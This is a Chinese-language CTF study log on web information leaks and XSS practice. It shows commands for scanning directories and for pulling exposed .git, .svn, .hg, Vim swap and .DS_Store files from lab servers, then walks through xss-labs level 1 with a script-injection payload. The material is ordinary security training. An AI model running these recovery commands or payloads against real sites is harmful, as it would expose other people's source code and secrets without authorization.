## 二、学习内容与实践记录

### 1. Web 信息泄露

在靶场测试中，可先使用 `dirsearch` 扫描目标站点目录，发现敏感文件或隐藏目录：

```bash
dirsearch -u http://docker.qingcen.net:44465
```

#### （1）phpinfo 信息泄露

`phpinfo()` 是 PHP 中用于查看环境配置信息的函数。当页面执行 `phpinfo()` 时，会将服务端 PHP 版本、模块配置、环境变量、绝对路径等信息打印出来，做题时可在页面中直接搜索 `flag` 或敏感环境变量。

#### （2）备份文件泄露

推测目标存在源码或敏感文件备份时，可以尝试爆破常见备份后缀名：

```text
.zip
.rar
.tar
.tar.gz
.7z
.bak
.old
.swp
.txt
```

#### （3）Git 泄露

**方法一：使用 GitHack 还原**

```bash
python3 GitHack.py 'http://docker.qingcen.net:44461/.git'
```

如果还原出的最新源码中没有找到 `flag`，说明真正的源码或 `flag` 大概率存在于**历史提交记录**、**其他分支**或**暂存区（stash）**中（即曾经提交过，后续提交中又被删除）。

**方法二：使用 git-dumper 提取完整仓库并审计历史记录**

```bash
git-dumper http://docker.qingcen.net:44468/.git/ 1
cd 1
```

提取完成后，按以下步骤排查：

1. **审计历史提交记录**：查看所有分支的提交历史及每次提交增删的文件，重点关注类似 `remove flag`、`delete code`、`update` 等提交信息，或删除了可疑 `.php` / `.txt` 文件的 Commit ID：
  
  ```bash
  git log --all --stat
  ```
  
2. **查看所有历史提交的具体代码差异**：
  
  ```bash
  git log -p
  ```
  
3. **查看指定历史 Commit 的变更内容**：假设发现可疑 Commit ID（如 `8f3a9b2...`），直接查看该次提交的代码变更，`flag` 往往在被删除的行中：
  
  ```bash
  git show 8f3a9b2...
  ```
  
4. **回滚本地仓库到指定历史版本**：
  
  ```bash
  git reset --hard 8f3a9b2...
  ```
  
5. **检查其他分支与暂存区**：若历史 Commit 中仍未找到，继续检查其他分支或暂存区：
  

- 查看所有分支：`git branch -a`（若有特殊分支，用 `git checkout 分支名` 切换）
- 查看暂存区：`git stash list`（若有记录，用 `git stash pop` 弹出隐藏更改）

#### （4）SVN 泄露

使用 `dvcs-ripper` 中的 `rip-svn.pl` 还原：

```bash
./rip-svn.pl -u http://docker.qingcen.net:44476/.svn/
```

一般会还原出 `index.php`、`flag.php` 等文件。如果当前目录没有直接恢复出文件，可按以下步骤处理：

1. 执行 `ls -la` 查看当前目录是否生成了 `.svn` 隐藏文件夹。
  
2. 若存在 `.svn` 目录，执行以下命令**递归撤销当前 SVN 工作副本中的本地修改**，从 `.svn` 保存的原始内容中恢复被删除的文件：
  
  ```bash
  svn revert -R .
  ```
  
3. 若仍无输出，可执行 `cd .svn` 进入目录内部（如 `pristine` 目录）查找文本内容。
  

#### （5）HG泄露

使用 `dvcs-ripper` 中的 `rip-hg.pl` 还原：

```bash
./rip-hg.pl -v -u http://docker.qingcen.net:44484/.hg/
```

如果未直接恢复出 `index.php`、`flag.php` 等文件，可进入 `.hg` 目录，结合 `ls`、`cd`、`cat` 或 `grep` 查找历史记录与存储文件。

#### （6）Vim 临时交换文件泄露

使用 Vim 编写文件（如 `flag.txt` 或 `index.php`）时，会产生临时交换文件。若正常退出，交换文件会被自动删除；若异常退出，交换文件会残留在服务器目录下：

- 第一次意外退出：产生 `.index.php.swp`
- 第二次意外退出：产生 `.index.php.swo`
- 第三次意外退出：产生 `.index.php.swn`

**利用方式：**

1. 直接访问或下载交换文件：
  
  ```bash
  curl -O http://docker.qingcen.net:44487/.flag.txt.swp
  ```
  
2. 使用 `strings` 提取二进制交换文件中的可读字符串：
  
  ```bash
  strings -a .flag.txt.swp
  ```
  
3. 或使用 Vim 直接恢复文件：
  
  ```bash
  vim -r .flag.txt.swp
  ```
  

#### （7）.DS_Store 文件泄露

macOS 系统在目录中生成的 `.DS_Store` 文件可能会泄露目录下的文件名或子目录路径。

1. 下载 `.DS_Store` 文件：
  
  ```bash
  curl -O http://docker.qingcen.net:44496/.DS_Store
  ```
  
2. 使用 `strings` 按不同编码提取其中的可读文件名信息：
  
  ```bash
  # 普通 ASCII
  strings -a .DS_Store
  # 扩展单字节字符
  strings -a -e S .DS_Store
  # UTF-16BE / UTF-16LE
  strings -a -e b .DS_Store
  strings -a -e l .DS_Store
  # UTF-32BE / UTF-32LE
  strings -a -e B .DS_Store
  strings -a -e L .DS_Store
  ```
  
3. 根据提取出的隐藏路径访问目标文件：
  
  ```bash
  curl http://docker.qingcen.net:44439/.archive/.sync_part_aa
  ```
  
  回显内容：
  
  ```text
  H4sIAAAAAAAAA0vLSUyvTkyzSDFNM0nUNUk1s9A1SUlM1LWwsLTQNTZLSjIyTkoySUs1qAUAcX3vCCoAAAA=
  ```
  
  以 `H4sIA` 开头的字符串通常代表 **gzip 压缩后再经过 Base64 编码的数据**，可通过管道命令解码还原：
  
  ```bash
  echo 'H4sIAAAAAAAAA0vLSUyvTkyzSDFNM0nUNUk1s9A1SUlM1LWwsLTQNTZLSjIyTkoySUs1qAUAcX3vCCoAAAA=' | base64 -d | gzip -d
  ```

### 2. XSS 靶场搭建与练习（xss-labs）

#### （1）本地搭建 xss-labs 靶场

1. **安装并配置 phpstudy**
  - 启动 Apache 服务。
  - 在“软件管理”中确认已安装 PHP 7.3 / 7.4（默认已安装 PHP 7.3）。
2. **下载并部署源码**
  - 从仓库 `https://github.com/do0dl3/xss-labs` 点击 `Code → Download ZIP` 下载源码。
  - 解压后放入 `phpstudy_pro\WWW` 目录，并将文件夹重命名为 `xss-labs`。
3. **访问靶场**
  - 浏览器访问：`http://localhost/xss-labs`

#### （2）第一关（Level 1）通关记录

- **初始 URL**：
  
  ```text
  http://localhost/xss-labs/level1.php?name=test
  ```
  
- **构造 Payload**：将参数 `test` 替换为 `<script>alert(1)</script>`：
  
  ```text
  http://localhost/xss-labs/level1.php?name=<script>alert(1)</script>
  ```
  

| 组成部分 | 作用说明 |
| --- | --- |
| `<script>` | HTML 脚本开始标签，告诉浏览器内部是可执行脚本代码 |
| `alert(1)` | 调用 JavaScript 弹窗函数 |
| `</script>` | HTML 脚本结束标签 |

- **源码分析**：
  查看页面源码可以发现，靶场预先重写了 `window.alert` 函数：
  
  ```javascript
  window.alert = function() {
    confirm("完成的不错！");
    window.location.href = "level2.php?keyword=test";
  }
  ```
  
  因此当注入的 `alert(1)` 被执行时，触发的不是默认的数字弹窗，而是靶场自定义的通关提示并自动跳转到第二关。
